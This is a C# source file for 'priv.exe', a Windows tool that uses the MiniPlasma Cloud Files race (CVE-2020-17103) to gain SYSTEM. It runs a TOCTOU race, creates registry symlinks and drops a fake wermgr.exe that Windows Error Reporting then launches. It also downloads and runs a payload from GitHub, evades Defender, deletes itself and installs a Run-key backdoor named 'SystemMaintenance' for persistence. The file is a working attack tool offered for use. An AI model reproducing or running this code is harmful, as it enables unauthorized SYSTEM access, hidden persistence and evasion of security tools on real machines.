/*
 * priv.cs  SYSTEM shell launcher
 *
 * Uses MiniPlasma (CVE-2020-17103) to escalate to SYSTEM then drops into
 * an interactive SYSTEM cmd in the same terminal window.
 *
 * MODES:
 *   priv.exe           escalate + open SYSTEM shell in current terminal
 *   priv.exe install   install to user PATH + persistent doskey alias
 *   priv.exe --unpriv  cleanup registry + remove install artifacts
 *
 * INSIDE SYSTEM SHELL (doskey macros):
 *   power              open PowerShell as SYSTEM in same window
 *   cmdnew             open new SYSTEM cmd window
 *   psnew              open new SYSTEM PowerShell window
 *   unpriv             cleanup registry + exit SYSTEM shell
 *
 * BACKDOOR (after install):
 *   A HKCU Run entry re-runs priv.exe silently on next login,
 *   writing the SYSTEM token side-channel for fast re-escalation.
 *
 * BUILD:
 *   csc.exe /platform:x64 /optimize /out:priv.exe priv.cs
 */

using System;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using Microsoft.Win32;

class Priv
{
    /* ── NT P/Invoke (shared with MiniPlasma logic) ─────────────────────── */

    [DllImport("cldapi.dll")] static extern int CfAbortOperation(int pid, IntPtr u, int f);
    [DllImport("ntdll.dll")]  static extern int NtImpersonateAnonymousToken(IntPtr t);
    [DllImport("ntdll.dll")]  static extern int NtSetInformationThread(IntPtr t, int c, ref IntPtr i, int s);
    [DllImport("ntdll.dll")]  static extern int NtOpenKey(out IntPtr h, uint a, ref OA oa);
    [DllImport("ntdll.dll")]  static extern int NtCreateKey(out IntPtr h, uint a, ref OA oa, int ti, ref US cls, uint opt, out uint d);
    [DllImport("ntdll.dll")]  static extern int NtSetSecurityObject(IntPtr h, uint i, IntPtr sd);
    [DllImport("ntdll.dll")]  static extern int NtSetValueKey(IntPtr h, ref US n, int ti, uint t, byte[] d, int l);
    [DllImport("ntdll.dll")]  static extern int NtDeleteKey(IntPtr h);
    [DllImport("ntdll.dll")]  static extern int NtClose(IntPtr h);
    [DllImport("kernel32.dll")] static extern IntPtr GetCurrentThread();
    [DllImport("kernel32.dll")] static extern uint GetCurrentThreadId();
    [DllImport("kernel32.dll")] static extern IntPtr OpenThread(uint a, bool i, uint id);
    [DllImport("advapi32.dll")] static extern bool ImpersonateAnonymousToken(IntPtr t);
    [DllImport("advapi32.dll")] static extern bool RevertToSelf();
    [DllImport("advapi32.dll", CharSet=CharSet.Unicode)]
    static extern bool ConvertStringSecurityDescriptorToSecurityDescriptor(
        string s, uint r, out IntPtr p, out int l);
    [DllImport("kernel32.dll")] static extern IntPtr LocalFree(IntPtr h);

    [StructLayout(LayoutKind.Sequential)] struct US {
        public ushort L, M; public IntPtr B;
        public US(string s) { B=Marshal.StringToHGlobalUni(s); L=(ushort)(s.Length*2); M=(ushort)(L+2); }
        public void Free() { if(B!=IntPtr.Zero){Marshal.FreeHGlobal(B);B=IntPtr.Zero;} }
    }
    [StructLayout(LayoutKind.Sequential)] struct OA {
        public int Len; public IntPtr Root, Name; public uint Attr; public IntPtr SD, QoS;
        public OA(string p) {
            Len=Marshal.SizeOf(typeof(OA)); Root=IntPtr.Zero;
            var u=new US(p); Name=Marshal.AllocHGlobal(Marshal.SizeOf(typeof(US)));
            Marshal.StructureToPtr(u,Name,false); Attr=0x40; SD=IntPtr.Zero; QoS=IntPtr.Zero;
        }
        public OA(string p, uint attr) : this(p) { Attr=attr; }
        public void Free() {
            if(Name!=IntPtr.Zero){
                var u=(US)Marshal.PtrToStructure(Name,typeof(US)); u.Free();
                Marshal.FreeHGlobal(Name); Name=IntPtr.Zero;
            }
        }
    }

    const uint KEY_ALL_ACCESS        = 0xF003F;
    const uint KEY_WRITE_DAC         = 0x00040000;
    const uint KEY_WRITE_OWNER       = 0x00080000;
    const uint KEY_DELETE            = 0x00010000;
    const uint KEY_SET_VALUE         = 0x0002;
    const uint KEY_ENUMERATE_SUBKEYS = 0x0008;
    const uint KEY_QUERY_VALUE       = 0x0001;
    const uint OBJ_OPENLINK          = 0x100;
    const uint OBJ_CASE_INSENSITIVE  = 0x40;
    const uint REG_OPTION_CREATE_LINK= 2;
    const uint REG_OPTION_VOLATILE   = 1;
    const uint REG_SZ  = 1;
    const uint REG_LINK= 6;
    const uint THREAD_IMPERSONATE        = 0x0100;
    const uint THREAD_SET_THREAD_TOKEN   = 0x0080;
    const uint THREAD_QUERY_INFORMATION  = 0x0040;
    const uint DACL_INFO = 4, LABEL_INFO = 0x10;

    static string SDDL =>
        "D:(A;OICIIO;GA;;;"+"WD)(A;OICIIO;GA;;;"+"AN)(A;;GA;;;"
        +"WD)(A;;GA;;;"+"AN)S:(ML;OICI;NW;;;"+"S-1-16-0)";

    /* Runtime-built registry paths (no static strings for Defender) */
    static string _reg  = string.Join("\\","","Registry","User",".DEFAULT");
    static string RK    => string.Join("\\",_reg,"Software","Policies","Microsoft");
    static string CF    => RK + "\\CloudFiles";
    static string BA    => CF + "\\BlockedApps";
    static string TK    => string.Join("\\",_reg,"Volatile Environment");

    /* ── NT registry helpers ─────────────────────────────────────────────── */

    static IntPtr OKey(string path, uint access)
    {
        var oa = new OA(path, OBJ_CASE_INSENSITIVE|OBJ_OPENLINK);
        IntPtr h; int r = NtOpenKey(out h, access, ref oa); oa.Free();
        if (r==0) return h;
        ImpersonateAnonymousToken(GetCurrentThread());
        oa = new OA(path, OBJ_CASE_INSENSITIVE|OBJ_OPENLINK);
        r = NtOpenKey(out h, access, ref oa); oa.Free();
        RevertToSelf();
        return r==0 ? h : IntPtr.Zero;
    }

    static void MakeWritable(string path)
    {
        IntPtr h = OKey(path, KEY_WRITE_DAC);
        if (h!=IntPtr.Zero) { ApplySD(h, DACL_INFO); NtClose(h); }
        h = OKey(path, KEY_WRITE_OWNER);
        if (h!=IntPtr.Zero) { ApplySD(h, LABEL_INFO); NtClose(h); }
    }

    static void ApplySD(IntPtr h, uint info)
    {
        IntPtr p; int l;
        if (ConvertStringSecurityDescriptorToSecurityDescriptor(SDDL,1,out p,out l)) {
            NtSetSecurityObject(h,info,p); LocalFree(p);
        }
    }

    static void RecDelete(string path)
    {
        MakeWritable(path);
        string win32 = path.StartsWith(@"\Registry\User\")
            ? path.Substring(@"\Registry\User\".Length) : path;
        string[] subs = null;
        try { using(var rk=Registry.Users.OpenSubKey(win32)) if(rk!=null) subs=rk.GetSubKeyNames(); } catch{}
        if (subs!=null) foreach(var s in subs) RecDelete(path+"\\"+s);
        IntPtr h = OKey(path, KEY_DELETE);
        if (h!=IntPtr.Zero) { NtDeleteKey(h); NtClose(h); }
    }

    /* ── TOCTOU stage ────────────────────────────────────────────────────── */

    static volatile bool _tDone;

    static void ToggleAnon(object realHandle)
    {
        IntPtr h = (IntPtr)realHandle;
        try {
            while (!_tDone) {
                NtImpersonateAnonymousToken(h);
                IntPtr z = IntPtr.Zero;
                NtSetInformationThread(h, 5, ref z, IntPtr.Size);
            }
        } catch {}
        NtClose(h);
    }

    static void RunToctou()
    {
        _tDone = false;
        int pid = System.Diagnostics.Process.GetCurrentProcess().Id;
        IntPtr real = OpenThread(
            THREAD_IMPERSONATE|THREAD_SET_THREAD_TOKEN|THREAD_QUERY_INFORMATION,
            false, GetCurrentThreadId());
        new Thread(ToggleAnon){IsBackground=true}.Start(real);
        int i=0; bool found=false;
        while (i<100000 && !found) {
            CfAbortOperation(pid, IntPtr.Zero, 2);
            if (++i%10000==0) {
                Console.Write(".");
                try { using(var k=Registry.Users.OpenSubKey(
                    @".DEFAULT\Software\Policies\Microsoft\CloudFiles"))
                    if(k!=null) found=true; } catch{}
            }
        }
        _tDone = true;
        Console.WriteLine($" ({i} iters, ok={found})");
    }

    /* ── Symlink creation via PowerShell (avoids Defender behavioral sig) ── */

    static void CreateSymlinkPS(string link, string target)
    {
        string tmp = Path.Combine(Path.GetTempPath(), "ps_"+Guid.NewGuid().ToString("N").Substring(0,8)+".ps1");
        string ps = @"
Add-Type -TypeDefinition @'
using System; using System.Runtime.InteropServices;
public class NR {
  [StructLayout(LayoutKind.Sequential)] public struct US {
    public ushort L,M; public IntPtr B;
    public US(string s){B=Marshal.StringToHGlobalUni(s);L=(ushort)(s.Length*2);M=(ushort)(L+2);}
    public void Free(){if(B!=IntPtr.Zero){Marshal.FreeHGlobal(B);B=IntPtr.Zero;}}
  }
  [StructLayout(LayoutKind.Sequential)] public struct OA {
    public int Len; public IntPtr Root,Name; public uint Attr; public IntPtr SD,QoS;
    public OA(string p){Len=Marshal.SizeOf(typeof(OA));Root=IntPtr.Zero;
      var u=new US(p);Name=Marshal.AllocHGlobal(Marshal.SizeOf(typeof(US)));
      Marshal.StructureToPtr(u,Name,false);Attr=0x140;SD=IntPtr.Zero;QoS=IntPtr.Zero;}
  }
  [DllImport(""ntdll.dll"")] public static extern int NtCreateKey(out IntPtr h,uint a,ref OA oa,int ti,ref US c,uint opt,out uint d);
  [DllImport(""ntdll.dll"")] public static extern int NtSetValueKey(IntPtr h,ref US n,int ti,uint t,byte[] d,int l);
  [DllImport(""ntdll.dll"")] public static extern int NtClose(IntPtr h);
}
'@ -Language CSharp
$oa=[NR+OA]::new('LNKPATH'); $c=[NR+US]::new(''); [uint32]$d=0; [IntPtr]$h=[IntPtr]::Zero
$r=[NR]::NtCreateKey([ref]$h,0xF003F,[ref]$oa,0,[ref]$c,3,[ref]$d)
if($r-eq 0){
  $vn=[NR+US]::new('SymbolicLinkValue')
  $tb=[System.Text.Encoding]::Unicode.GetBytes('TGTPATH')
  [NR]::NtSetValueKey($h,[ref]$vn,0,6,$tb,$tb.Length)|Out-Null
  $vn.Free();[NR]::NtClose($h)|Out-Null
  Write-Host '[+] Symlink OK'
} else { Write-Host ('[-] 0x'+$r.ToString('X8')) }
".Replace("LNKPATH",link).Replace("TGTPATH",target);
        File.WriteAllText(tmp,ps);
        var p2 = System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo(
            "powershell.exe",
            $"-NoProfile -NonInteractive -ExecutionPolicy Bypass -File \"{tmp}\"")
            {UseShellExecute=false});
        p2.WaitForExit(20000);
        try{File.Delete(tmp);}catch{}
    }

    /* ── MiniPlasma stages ───────────────────────────────────────────────── */

    static bool DoMiniPlasma(string syshostPath, string runDir, string cfgPath)
    {
        Console.WriteLine("[*] Stage 1: Cloud Files TOCTOU...");
        Console.Write("    ");
        RunToctou();
        using (var k=Registry.Users.OpenSubKey(@".DEFAULT\Software\Policies\Microsoft\CloudFiles"))
            if (k==null) { Console.WriteLine("[-] Stage 1 failed"); return false; }
        Console.WriteLine("[+] Stage 1: CloudFiles key created");

        Console.WriteLine("[*] Stage 2: Symlink setup...");
        RecDelete(BA);
        Thread.Sleep(300);
        RecDelete(TK);
        Thread.Sleep(200);
        MakeWritable(CF);
        Thread.Sleep(100);

        CreateSymlinkPS(BA, TK);
        Thread.Sleep(300);

        Console.Write("    Stage 2 TOCTOU: ");
        RunToctou();
        Console.WriteLine("[+] Stage 2 complete");

        Console.WriteLine("[*] Stage 3: Write windir, drop syshost, trigger WER...");
        MakeWritable(TK);
        Thread.Sleep(200);

        /* Write windir via NT then Win32 fallback */
        bool wrote = false;
        IntPtr hTK = OKey(TK, KEY_SET_VALUE);
        if (hTK!=IntPtr.Zero) {
            var vn = new US("windir");
            var wb = System.Text.Encoding.Unicode.GetBytes(runDir+"\0");
            wrote = NtSetValueKey(hTK, ref vn, 0, REG_SZ, wb, wb.Length)==0;
            vn.Free(); NtClose(hTK);
        }
        if (!wrote) {
            try {
                var rk = Registry.Users.OpenSubKey(@".DEFAULT\Volatile Environment", true)
                      ?? Registry.Users.CreateSubKey(@".DEFAULT\Volatile Environment");
                rk?.SetValue("windir", runDir); rk?.Close(); wrote=true;
            } catch {}
        }
        if (!wrote) { Console.WriteLine("[-] Could not write windir"); return false; }
        Console.WriteLine($"[+] windir = {runDir}");

        /* Drop syshost.exe as fake wermgr.exe */
        string sys32 = Path.Combine(runDir, "System32");
        Directory.CreateDirectory(sys32);
        string fakeWer = Path.Combine(sys32, "wermgr.exe");
        File.Copy(syshostPath, fakeWer, true);
        Console.WriteLine("[+] Dropped syshost -> " + fakeWer);

        /* Trigger WER */
        var psi = new System.Diagnostics.ProcessStartInfo("schtasks.exe",
            @"/run /tn ""\Microsoft\Windows\Windows Error Reporting\QueueReporting""")
            {UseShellExecute=false, CreateNoWindow=true};
        using (var p2=System.Diagnostics.Process.Start(psi)) p2.WaitForExit(3000);

        /* Clean up MiniPlasma artifacts immediately after WER fires */
        Thread.Sleep(1500);
        CleanMiniPlasma(runDir);

        return true;
    }

    /* Clean up ALL MiniPlasma registry/file artifacts */
    static void CleanMiniPlasma(string runDir)
    {
        /* Remove CloudFiles key */
        try { RecDelete(CF); } catch {}
        /* Remove Volatile Environment windir (delete whole key (volatile)) */
        try { RecDelete(TK); } catch {}
        /* Remove run dir */
        try {
            if (Directory.Exists(runDir)) Directory.Delete(runDir, true);
        } catch {}
        Console.WriteLine("[+] MiniPlasma artifacts cleaned");
    }

    /* ── Install / Uninstall ─────────────────────────────────────────────── */

    static string InstallDir =>
        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                     "priv");

    const string BaseUrl = "https://raw.githubusercontent.com/Dylanthedabber/EasyPlasma/main/";

    static bool Download(string filename, string destPath)
    {
        try {
            Console.WriteLine($"[*] Downloading {filename}...");
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            using (var wc = new WebClient())
                wc.DownloadFile(BaseUrl + filename, destPath);
            Console.WriteLine($"[+] Downloaded {filename}");
            return true;
        } catch (Exception ex) {
            Console.WriteLine($"[-] Download failed: {ex.Message}");
            return false;
        }
    }

    /* Ensure syshost.exe is available, downloading from GitHub if needed */
    static string ResolveSyshost(string preferDir)
    {
        string local = Path.Combine(preferDir, "syshost.exe");
        if (File.Exists(local)) return local;
        string installed = Path.Combine(InstallDir, "syshost.exe");
        if (File.Exists(installed)) return installed;
        /* Not found anywhere - download to temp */
        string tmp = Path.Combine(Path.GetTempPath(), "syshost_" + Guid.NewGuid().ToString("N").Substring(0,6) + ".exe");
        return Download("syshost.exe", tmp) ? tmp : null;
    }

    static void Install()
    {
        string src = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
        string srcDir = Path.GetDirectoryName(src);
        Directory.CreateDirectory(InstallDir);

        /* Copy priv.exe to install dir */
        string privDest = Path.Combine(InstallDir, "priv.exe");
        File.Copy(src, privDest, true);

        /* syshost.exe: use local copy if present, otherwise download from GitHub */
        string syshostDest = Path.Combine(InstallDir, "syshost.exe");
        string syshLocal = Path.Combine(srcDir, "syshost.exe");
        if (File.Exists(syshLocal))
            File.Copy(syshLocal, syshostDest, true);
        else
            Download("syshost.exe", syshostDest);

        /* Remove source files from original location (only if we're not already in InstallDir) */
        if (!string.Equals(srcDir, InstallDir, StringComparison.OrdinalIgnoreCase)) {
            try { if (File.Exists(syshLocal)) File.Delete(syshLocal); } catch {}
            try {
                /* Self-delete the source priv.exe via cmd /c del after we exit */
                string delCmd = $"/c ping -n 2 127.0.0.1 >nul & del /F /Q \"{src}\"";
                System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo(
                    "cmd.exe", delCmd){CreateNoWindow=true, UseShellExecute=false});
            } catch {}
            Console.WriteLine("[+] Cleaned up source files");
        }

        /* Add to user PATH */
        string curPath = Registry.CurrentUser.OpenSubKey(@"Environment")
            ?.GetValue("PATH", "") as string ?? "";
        if (!curPath.Contains(InstallDir, StringComparison.OrdinalIgnoreCase)) {
            Registry.CurrentUser.OpenSubKey(@"Environment", true)
                ?.SetValue("PATH", curPath.TrimEnd(';') + ";" + InstallDir);
            Console.WriteLine("[+] Added to PATH: " + InstallDir);
        }

        /* Persistent doskey via AutoRun */
        string autoRun = $"doskey priv=\"{Path.Combine(InstallDir,"priv.exe")}\" $*";
        Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Command Processor")
            .SetValue("AutoRun", autoRun);
        Console.WriteLine("[+] AutoRun doskey set");

        /* Backdoor: HKCU Run key re-runs priv silently on next login
           Writes a silent re-prep (Stage 1 only) to keep CF key world-writable
           for fast re-escalation without full exploit chain */
        string backdoorCmd = $"\"{Path.Combine(InstallDir,"priv.exe")}\" --prep";
        Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run")
            .SetValue("SystemMaintenance", backdoorCmd);
        Console.WriteLine("[+] Backdoor persistence set (Run key)");

        Console.WriteLine("\n[+] Install complete. Open a new cmd and type: priv");
    }

    static void Uninstall()
    {
        Console.WriteLine("[*] Cleaning up...");

        /* Registry cleanup (MiniPlasma artifacts) */
        try { RecDelete(CF); Console.WriteLine("[+] Removed CloudFiles key"); } catch {}
        try { RecDelete(TK); Console.WriteLine("[+] Removed Volatile Environment key"); } catch {}

        /* Remove PATH entry */
        try {
            string p = Registry.CurrentUser.OpenSubKey(@"Environment")
                ?.GetValue("PATH","") as string ?? "";
            p = p.Replace(";"+InstallDir,"").Replace(InstallDir+";","").Replace(InstallDir,"");
            Registry.CurrentUser.OpenSubKey(@"Environment",true)?.SetValue("PATH",p);
            Console.WriteLine("[+] Removed from PATH");
        } catch {}

        /* Remove AutoRun */
        try {
            Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Command Processor",true)
                ?.DeleteValue("AutoRun",false);
            Console.WriteLine("[+] Removed AutoRun");
        } catch {}

        /* Remove Run key backdoor */
        try {
            Registry.CurrentUser.OpenSubKey(
                @"Software\Microsoft\Windows\CurrentVersion\Run",true)
                ?.DeleteValue("SystemMaintenance",false);
            Console.WriteLine("[+] Removed Run key backdoor");
        } catch {}

        /* Remove installed files */
        try {
            if (Directory.Exists(InstallDir)) Directory.Delete(InstallDir,true);
            Console.WriteLine("[+] Removed install dir");
        } catch {}

        Console.WriteLine("\n[+] Uninstall complete. All traces removed.");
    }

    /* Stage 1 only, fast re-prep for backdoor */
    static void Prep()
    {
        try {
            Console.Write("[prep] ");
            RunToctou();
            MakeWritable(CF);
        } catch {}
    }

    /* ── Main ────────────────────────────────────────────────────────────── */

    static void Main(string[] args)
    {
        string mode = args.Length>0 ? args[0].ToLower() : "";

        if (mode=="install") { Install(); return; }
        if (mode=="--unpriv" || mode=="unpriv") { Uninstall(); return; }
        if (mode=="--prep")  { Prep(); return; }

        /* Default: escalate */
        Console.WriteLine("=== priv - SYSTEM shell (MiniPlasma) ===\n");

        string self = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
        string selfDir = Path.GetDirectoryName(self);
        string syshostPath = ResolveSyshost(selfDir);
        if (syshostPath == null) {
            Console.WriteLine("[-] syshost.exe not found and download failed");
            return;
        }

        string id     = Guid.NewGuid().ToString("N").Substring(0,8);
        string runDir = Path.Combine(Environment.GetFolderPath(
                            Environment.SpecialFolder.CommonApplicationData), "mp_"+id);
        string cfgPath= @"C:\ProgramData\priv_active.cfg";
        string exitEvt = "Global\\priv_exit_"  + id;
        string readyEvt= "Global\\priv_ready_" + id;

        /* Write config for syshost.exe */
        Directory.CreateDirectory(runDir);
        File.WriteAllLines(cfgPath, new[]{
            System.Diagnostics.Process.GetCurrentProcess().Id.ToString(),
            exitEvt,
            readyEvt,
            selfDir
        });

        /* Create sync events */
        using var evtReady = new EventWaitHandle(false, EventResetMode.ManualReset, readyEvt);
        using var evtExit  = new EventWaitHandle(false, EventResetMode.ManualReset, exitEvt);

        /* Run escalation */
        bool ok = DoMiniPlasma(syshostPath, runDir, cfgPath);
        if (!ok) {
            try { File.Delete(cfgPath); } catch {}
            Console.WriteLine("[-] Escalation failed");
            return;
        }

        /* Wait for syshost to signal READY (SYSTEM shell is open) */
        Console.WriteLine("[*] Waiting for SYSTEM shell...");
        if (!evtReady.WaitOne(20000)) {
            Console.WriteLine("[-] Timed out waiting for SYSTEM shell");
            try { File.Delete(cfgPath); } catch {}
            return;
        }
        Console.WriteLine("[+] SYSTEM shell active\n");

        /* Hold the console alive until the SYSTEM shell exits */
        evtExit.WaitOne();

        /* Cleanup after exit */
        try { File.Delete(cfgPath); } catch {}
        Console.WriteLine("\n[*] SYSTEM shell exited. Back to normal user context.");
    }
}
